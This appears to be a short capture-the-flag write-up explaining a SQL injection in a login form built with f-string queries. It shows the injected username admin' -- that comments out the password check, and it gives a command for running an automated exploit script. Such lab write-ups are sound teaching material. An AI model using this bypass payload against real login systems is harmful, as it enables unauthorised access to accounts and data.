## Summary

The login form is vulnerable to SQL injection because the backend builds the SQL query with f-strings and directly interpolates user input.

## Exploitation

The query used by the service is:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Inject a SQL comment to bypass the password check. For example, submit:

- Username: `admin' -- `
- Password: `anything`

This turns the query into:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

The `-- ` sequence comments out the rest of the line, so the password condition is ignored and the login succeeds, revealing the flag.

## Automated exploit

Run:

```bash
pip install -r requirements.txt
./exploit --url http://HOST:5000/
```

